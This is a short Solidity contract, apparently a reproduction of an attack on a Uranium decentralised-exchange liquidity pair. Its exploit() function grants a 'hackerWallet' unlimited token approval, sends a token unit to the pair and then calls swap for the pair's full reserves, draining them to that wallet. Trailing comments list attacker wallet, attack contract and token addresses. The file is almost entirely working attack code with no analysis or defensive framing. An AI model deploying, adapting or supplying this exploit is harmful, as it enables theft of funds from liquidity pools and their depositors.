pragma solidity >=0.6.6;

import './IUraniumFactory.sol';
import './IUraniumPair.sol';
import './IERC20.sol';

contract Uranium {
    address private constant uraniumFactory = address(0xd0A1E359811322d97991E03f863a0C30C2cF029C);
    address private constant hackerWallet = address(0x6AC0A1913B9527E40427372c627299D2A2056A83);
    uint256 approveValue = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
    
    function exploit() external {
        address pair = IUraniumFactory(uraniumFactory).allPairs(0); //2
        address token0 = IUraniumPair(pair).token0(); //3
        address token1 = IUraniumPair(pair).token1(); //4
        IERC20(token0).approve(hackerWallet, approveValue); //5
        IERC20(token1).approve(hackerWallet, approveValue); //6
        IUraniumPair(pair).sync(); //7
        (uint reserve0, uint reserve1,) = IUraniumPair(pair).getReserves(); //10
        IERC20(token0).transfer(pair, 1); //11
        IERC20(token1).transfer(pair, 1); //12
        IUraniumPair(pair).swap(reserve0, reserve1, hackerWallet, new bytes(0)); //13
    }
}

/*
hackerWallet 0xc47bdd0a852a88a019385ea3ff57cf8de79f019d
hackContract 0x2b528a28451e9853f51616f3b0f6d82af8bea6ae
token0 0x670de9f45561a2d02f283248f65cbd26ead861c8
token1 0xe9e7cea3dedca5984780bafc599bd69add087d56
*/

//hackContract 0x21ad0493315a3784bE88e99d8068C20Ad2Dc994C